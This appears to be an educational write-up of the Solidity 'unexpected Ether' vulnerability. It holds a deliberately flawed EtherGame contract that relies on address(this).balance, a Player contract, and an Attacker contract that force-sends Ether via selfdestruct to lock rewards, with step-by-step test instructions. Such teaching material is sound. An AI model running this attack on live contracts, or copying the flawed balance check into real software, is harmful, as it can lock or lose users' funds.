Unexpected Ether

A contract may be vulnerable if it incorrectly uses address(this).balance. I modified the EtherGame contract from https://github.com/sigp/solidity-security-blog#3-unexpected-ether-1 wrote the Player and Attacker conract to demonstrate this vulnerability.

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

// Primarily for debugging purpose
// for Strings.toString()
import "@openzeppelin/contracts/utils/Strings.sol";

contract EtherGame {

    // Added for debugging purpose
    event Balance(uint); 
    
    uint public finalMileStone = 2 ether;
    uint public finalReward = 1 ether;

    uint currentBalance = address(this).balance;

    mapping(address => uint) redeemableEther;
    // users pay 0.5 ether. At specific milestones, credit their accounts
    function play() public payable {
        require(msg.value == 0.5 ether, "each play is 0.5 ether"); // each play is 0.5 ether
        
        // Probably a bug in the original contract as currentBalance was never becoming equal to finalMileStone
        //uint currentBalance = address(this).balance + msg.value;
        
        currentBalance += msg.value;
        
        // Had to add for debugging as the live above was giving me grief
        emit Balance(currentBalance);
        
        // ensure no players after the game as finished
        require(currentBalance <= finalMileStone, "currentBalance <= finalMileStone");
        
        // if at the final milestone credit the players account
        if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(address(this).balance == finalMileStone, Strings.toString(address(this).balance));
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0, "redeemableEther[msg.sender] = 0");
        uint transferValue = redeemableEther[msg.sender];
        redeemableEther[msg.sender] = 0;
        
        // Had to add payable() to make it work
        payable(msg.sender).transfer(transferValue);
    }

    // I added this for debugging purpose
    function tellBalance() public view returns(uint)
    {
        return address(this).balance;
    }
 }

//A genuine player
contract Player
{
    EtherGame public eg;
    
    constructor(address addr) payable
    {
        eg = EtherGame(addr);
    }
    
    function play() public
    {
        eg.play{value: 0.5 ether}();
    }
    
    function claimReward() public
    {
        eg.claimReward();
    }

    function tellBalance() public view returns(uint)
    {
        return address(this).balance;
    }

    // So claimReward() can send us ether
    fallback() payable external {}
}
 
// Malicious actor
contract Attacker
{
    EtherGame public eg;
    
    constructor(address addr) payable
    {
        eg = EtherGame(addr);
    }
    
    function attack() public
    {
        selfdestruct(payable(address(eg)));
        //payable(address(eg)).transfer(0.1 ether);
    }

    function tellBalance() public view returns(uint)
    {
        return address(this).balance;
    }
}

How to Test:

1. Deploy EtherGame and note the contract's address
2. Deploy the Player contract with 5 Ether and pass the address of EtherGame's address to the constructor
3. Deploy the Attacker contract with 0.1 Ether (10^17 wei) and pass the address of EtherGame's address to the constructor
4. Invoke EtherGame.tellBalance() - it should return 0
5. Invoke Attacker.tellBalance() - should return 100000000000000000 wei (i.e. 0.1 Ether)
6. Invoke Attacker.attack() - this will delete the Attacker contract and send its balance of 0.1 Ether to EtherGame even if it does not have a payable fallback() or receive()
7. Invoke Player.play() 4 times - this will deposit 2 Ether to EtherGame which will make you eligible for claimReward()
8. Invoke Player.claimReward() - this throws error because the EtherGame contract balance is 2.1 Ether instead of required 2 Ethers.
9. Repeat the above test without steps 6/7 and the Player contract should work as the creator of EtherGame intended.

The attack works because there are still two ways to send Ether to a contract even if there is no fallback() or receive() function in EtherGame contract: 
	1. Pre-sent Ether: The address where a contract will get deployed is determined by keccak256 hash of the creater's address and the transaction nonce. Since this address is deterministic, an attacker can deposit Ether at this address prior to the deployment of the contract.
	2. selfdestruct(): A contract (like our Attacker contract) can selfdestruct() itself and forcibly transfer ether to an other contract.
